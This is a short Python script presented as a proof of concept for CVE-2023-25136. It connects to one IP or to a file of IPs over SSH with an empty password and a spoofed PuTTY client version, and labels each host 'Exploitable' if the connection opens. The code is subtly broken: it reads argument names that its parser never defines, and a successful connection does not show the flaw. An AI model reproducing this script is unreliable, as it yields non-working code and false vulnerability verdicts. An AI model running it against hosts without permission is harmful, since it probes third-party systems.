# CVE-2023-25136 POC by LodzieNZ (under the GPL3 license)
# Telegram: t.me/lodzie
# Twitter: @LodzieIsHere

from fabric import Connection
from termcolor import colored
import argparse

class UniqueSSHVulnerabilityChecker:
    def __init__(self, client_name):
        self.client_name = client_name

    def check_vulnerability(self, target_ip):
        try:
            conn = Connection(target_ip, connect_kwargs={'password': ''})
            conn.client.version = f"SSH-2.0-{self.client_name}"
            conn.open()

            print(colored(f"{target_ip}: Exploitable", 'green'))
            conn.close()
        except Exception:
            print(colored(f"{target_ip}: Not Exploitable", 'red'))

if __name__ == '__main__':
    print(" == CVE-2023-25136 POC by LodzieNZ ==")

    parser = argparse.ArgumentParser(description='Check to see if CVE-2023-25136 is exploitable on a list of IPs.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', metavar='IP_ADDRESS', help='Input IP address here.')
    group.add_argument('-p', '--filepath', metavar='FILE_NAME', help='Path to a file containing a list of IPs to test.')
    args = parser.parse_args()

    client_name = "PuTTY_Release_0.66"
    checker = UniqueSSHVulnerabilityChecker(client_name)

    if args.ip:
        checker.check_vulnerability(args.ip)
    else:
        file_name = args.file
        with open(file_name, 'r') as file:
            for line in file:
                ip_address = line.strip()
                checker.check_vulnerability(ip_address)